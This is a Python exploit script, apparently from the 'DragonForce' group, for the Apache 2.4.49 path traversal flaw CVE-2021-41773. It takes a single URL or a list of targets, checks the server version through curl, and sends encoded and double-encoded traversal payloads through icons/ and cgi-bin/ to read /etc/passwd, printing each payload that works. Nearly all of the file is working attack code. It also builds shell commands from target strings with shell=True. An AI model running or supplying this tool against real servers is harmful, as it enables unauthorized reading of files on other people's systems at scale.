import cloudscraper, sys, time, os, colorama, ctypes, datetime, platform
from colorama import Fore, Back, Style
from datetime import date
from time import gmtime, strftime
from urllib.parse import urlparse
from subprocess import Popen, PIPE

today = date.today()
d2 = today.strftime("%B %d, %Y")

if platform.system()=='Linux':
    os.system('clear')
    sys.stdout.write("\x1b]2;CVE-2021-41773\x07")
else:
    os.system('cls')
    ctypes.windll.kernel32.SetConsoleTitleW(f'CVE-2021-41773 | {d2}')

print(f"""{Style.BRIGHT + Fore.RED}
 ██████╗ ██████╗  █████╗  ██████╗  ██████╗ ███╗   ██╗███████╗ ██████╗ ██████╗  ██████╗███████╗   ██╗ ██████╗ 
 ██╔══██╗██╔══██╗██╔══██╗██╔════╝ ██╔═══██╗████╗  ██║██╔════╝██╔═══██╗██╔══██╗██╔════╝██╔════╝   ██║██╔═══██╗
 ██║  ██║██████╔╝███████║██║  ███╗██║   ██║██╔██╗ ██║█████╗  ██║   ██║██████╔╝██║     █████╗     ██║██║   ██║
 ██║  ██║██╔══██╗██╔══██║██║   ██║██║   ██║██║╚██╗██║██╔══╝  ██║   ██║██╔══██╗██║     ██╔══╝     ██║██║   ██║
 ██████╔╝██║  ██║██║  ██║╚██████╔╝╚██████╔╝██║ ╚████║██║     ╚██████╔╝██║  ██║╚██████╗███████╗██╗██║╚██████╔╝
 ╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝  ╚═════╝ ╚═╝  ╚═══╝╚═╝      ╚═════╝ ╚═╝  ╚═╝ ╚═════╝╚══════╝╚═╝╚═╝ ╚═════╝ 
                                                                                                             
{Fore.WHITE}═══════════════════════════════════════════════════════════════════════════════════════════════════════════════
{Style.BRIGHT + Fore.YELLOW}  
                                Apache 2.4.49 Path Traversal Checker by Eagle Eye
                                       Make Sure You have curl function
                                https://dragonforce.io | Telegram: dragonforceio

{Fore.WHITE}═══════════════════════════════════════════════════════════════════════════════════════════════════════════════
""")

def helpdesk():
    print(Style.BRIGHT+Fore.YELLOW+'Usage (example) : python apache.py -u http://target.com/')
    print(Style.BRIGHT+Fore.YELLOW+'Usage (example) : python apache.py -f list.txt')

def loadFile(txt):
    try:
        f = open(txt,'r')
        lines = f.readlines()
        return lines
    except FileNotFoundError:
        try:
            sys.exit(0)
        except SystemExit:
            os._exit(0)

def SiteCheck(site,protocol):
    web_arr = urlparse(site)
    if(protocol=='http'):
        if(web_arr.path==site and web_arr.netloc=="" and web_arr.scheme==""):
            return "http://" + site + "/"
        elif(web_arr.path!="" and web_arr.scheme=="https"):
            return "http://" + web_arr.netloc + "/"
        else:
            return site + "/"
    elif(protocol=='https'):
        if(web_arr.path==site and web_arr.netloc=="" and web_arr.scheme==""):
            return "https://" + site + "/"
        elif(web_arr.path!="" and web_arr.scheme=="http"):
            return "https://" + web_arr.netloc + "/"
        else:
            return site + "/"
    else:
        print(Style.BRIGHT+Fore.RED+"Protocol must be defined!")
        sys.exit(0)

def VersionCheck(target):
    triggering = target + "%2e%2e/%2e%2e/%2e%2e/ehh_yala_tuih.txt"
    if platform.system()=='Linux':
        p = Popen(['curl -s --path-as-is '+triggering],stdout=PIPE,shell=True)
        (out, err) = p.communicate()
        checking = out.decode('utf-8')
        if 'Apache/2.4.49' in checking:
            return True
        else:
            return False
    else:
        p = Popen(['curl','-s','--path-as-is',triggering],stdout=PIPE,shell=True)
        (out, err) = p.communicate()
        checking = out.decode('utf-8')
        if 'Apache/2.4.49' in checking:
            return True
        else:
            return False

#incase you want to try from HTTP Request Method

def HttpRequestMethod(target):
    headers = {"Content-Type":"text/plain"}
    scraper = cloudscraper.create_scraper(
    browser={
        'browser': 'firefox',
        'platform': 'linux',
        'mobile': False
    }
)
    data = scraper.get(target,headers=headers)
    if ':root:' in data.text:
        return True
    else:
        return False


def DisclosePath(target):
    false_count = 2;
    setpath = ["icons/","cgi-bin/"]
    disclose = ".%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd"

    #incase for bypassing double encoded url
    disclose2 = ".%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/etc/passwd"

    if platform.system()=='Linux':
        for path in setpath:
            p = Popen(['curl -s --path-as-is '+target+path+disclose],stdout=PIPE,shell=True)
            (out, err) = p.communicate()
            checking = out.decode('utf-8')
            if ':root:' in checking:
                print(Style.BRIGHT+Fore.YELLOW+"[+]READABLE![+]\n"+Style.BRIGHT+Fore.GREEN+"Payload -> {}\n".format(target+path+disclose))
            else:
                retry = SiteCheck(target,'https')
                p = Popen(['curl -s --path-as-is '+retry+path+disclose],stdout=PIPE,shell=True)
                (out, err) = p.communicate()
                checking = out.decode('utf-8')
                if ':root:' in checking:
                    print(Style.BRIGHT+Fore.YELLOW+"[+]READABLE![+]\n"+Style.BRIGHT+Fore.GREEN+"Payload -> {}\n".format(retry+path+disclose))
                else:
                    false_count = false_count-1
    else:
        for path in setpath:
            p = Popen(['curl','-s','--path-as-is',target+path+disclose],stdout=PIPE,shell=True)
            (out, err) = p.communicate()
            checking = out.decode('utf-8')
            if ':root:' in checking:
                print(Style.BRIGHT+Fore.YELLOW+"[+]READABLE![+]\n"+Style.BRIGHT+Fore.GREEN+"Payload -> {}\n".format(target+path+disclose))
            else:
                retry = SiteCheck(target,'https')
                p = Popen(['curl','-s','--path-as-is',retry+path+disclose],stdout=PIPE,shell=True)
                (out, err) = p.communicate()
                checking = out.decode('utf-8')
                if ':root:' in checking:
                    print(Style.BRIGHT+Fore.YELLOW+"[+]READABLE![+]\n"+Style.BRIGHT+Fore.GREEN+"Payload -> {} \n".format(retry+path+disclose))
                else:
                    false_count = false_count-1
        if(false_count==0):
            print(Style.BRIGHT+Fore.RED+"Site not vulnerable or maybe payload cant be read!\n")

def ProcessTraversal(txt):
    lines = loadFile(txt)
    for line in lines:
        xline = line.replace("\n","")
        target = SiteCheck(xline,'http')
        if(VersionCheck(target)):
            print(Style.BRIGHT+Fore.BLUE+"Apache version for {} seems vulnerable!".format(target))
            DisclosePath(target)
        else:
            print(Style.BRIGHT+Fore.RED+"Target -> {} not vulnerable\n",format(target))

def DirectTraversal(site):
    target = SiteCheck(site,'http')
    if(VersionCheck(target)):
        print(Style.BRIGHT+Fore.BLUE+"Apache version for {} seems vulnerable!".format(target))
        DisclosePath(target)
    else:
        print(Style.BRIGHT+Fore.RED+"Target -> {} not vulnerable\n",format(target))

def position(arr,types):
    if(types=="-u" or types=="-f"):
        return arr.index(types) + 1
    else:
        return 0

def argvLength(arr):
    if(len(arr)<2):
        return False
    elif(len(arr)>3):
        return False
    else:
        return True

if(argvLength(sys.argv)==False):
    helpdesk()
    os._exit(0)
else:
    try:
        gotcha1 = position(sys.argv,"-f")
        if(gotcha1!="" and gotcha1!=None):
            ProcessTraversal(sys.argv[gotcha1])
    except:
        gotcha2 = position(sys.argv,"-u")
        if(gotcha2!="" and gotcha2!=None):
            DirectTraversal(sys.argv[gotcha2])